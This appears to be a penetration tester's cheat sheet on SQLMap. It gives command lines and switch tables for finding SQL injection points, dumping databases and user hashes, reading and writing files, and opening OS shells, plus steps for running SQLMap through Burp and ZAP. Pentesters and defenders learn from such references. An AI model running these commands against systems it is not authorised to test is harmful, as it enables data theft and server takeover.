---
title: SQLMap 
category: Web Application
order: 98
---

> **SQLMap Command**

{% highlight bash %}
#Crawl the site looking for vulnerable fields
sqlmap.py -u http://192.168.1.2 --crawl=1

#Use a request from burp or zap
sqlmap.py -u http://site/file.php?variable?name=vName --cookie="cookie" --proxy http://127.0.0.1:8081   --batch
sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 

#Count Rows
./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 --count -D sqli -T Customers

#Shell
./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 --os-shell

#Dump Tables
sqlmap.py -I rawrequest2.raw --tables
sqlmap.py -l rawrequest2.raw --dump -D wordpress -T wp_users
{% endhighlight %}

> **Riding Sessions**
*Note: This can have a performance impact*

**ZAP**
1. Click enable session tracking cookies

**Burp**
1. Click Options tab
2. Click Sessions sub-tab
3. Click Use cookies from Burps' cookie jar - Proxy, Spider, and Scanner

> **SQL Map Switches**

**Common switches:**

Discover SQL injection | <code> -u </code> 
Spider the site looking for injection points | <code> --crawl </code> 
Target forms for injection | <code> --forms </code>
Tell sqlmap the database | <code> --dbms </code> 
Capture HTTP Request or proxy log as starting point | <code> -r/-l </code> 
Manually set cookies | <code> --cookie (e.g., --cookie 'SESSID=42') </code>
Have sqlmap go through Burp/ZAP or another proxy | <code> --proxy (e.g., --proxy http://127.0.0.1:8081) </code>
Change User Agent (Default is sqlmap/#.#) | <code> --user-agent </code> 
Proved Referer <br> *WAFs may validate this (better way is use existing request -r or via a proxy)* | <code> --referer </code> 

**DB Enumeration:**

Dump the entire DMBS database | <code> --schema </code> 
To ignore system databases | <code> --exclude-sysdbs </code> 
Select database, table or Columns <br> *Be more tactical* | <code> --dbs/--tables/--columns  </code>  <br> -D/-T can be coupled with the above switch for example, list only tables in the Customer DB (-D Customer --tables)
Dump all data && metadata (scary!) | <code> --all </code> 
Count (No data exfiltrated) | <code> --count </code> 
Steals data given constraints | <code> --dump (e.g., -D Orders -T Customers --dump) </code> 
Exfiltrates all table data | <code> --dump-all </code> 
Scour DB/table/column for a string (e.g., pass) | <code> --search </code> 

**Beyond DB exfil:**

Enumerate DB user accounts | <code> --users </code> 
Show DB user account hashes | <code> --passwords </code>
Download files to attack the system | <code> --file-read </code> 
Upload files to the DB system | <code> --file-write </code>
Read/Write Windows registry keys | <code> --reg-read/--reg-write </code> 
Add/Delete Windows registry keys | <code> --reg-add/--reg-del </code> 

**Post Exploitation:**

Escalate Priv | <code> --priv-esc </code>
SQL Query | <code> --sql-query/--sql-shell </code>
OS Commands | <code> --os-cmd/--os-shell </code>
OS Pwn | <code> --os-pwn </code>

> **SQLMap with Burp/ZAP**

**Start SQLMap based on ZAP:**
1. Navigate to field with SQL injection (one that has no errors or SQL injection) -> right click on request -> save RAW
2. ./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 


**Start SQLMap based on Burp:**
1. Navigate to request with SQL injection (one that has no errors or SQL injection) -> right click on request -> copy to file
2. ./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081

**Run SQLMap in Zap**
1. tools -> optins -> applications -> add  -> 
* sqlmap
* navigate to sqlmap 
* as is
* -u %url% --cookie=%cookie% --batch
* capture output and note
* enabled
2. Right click on request in history -> run application -> SQLMap
3. Right click on request in history -> view note
4. Set up for each function you do frequently (e.g., tables, count, read file) 

>**Tamper Scripts**

* [SANS](https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win)


> **Tools**
* [SQLMap](https://github.com/sqlmapproject/sqlmap)

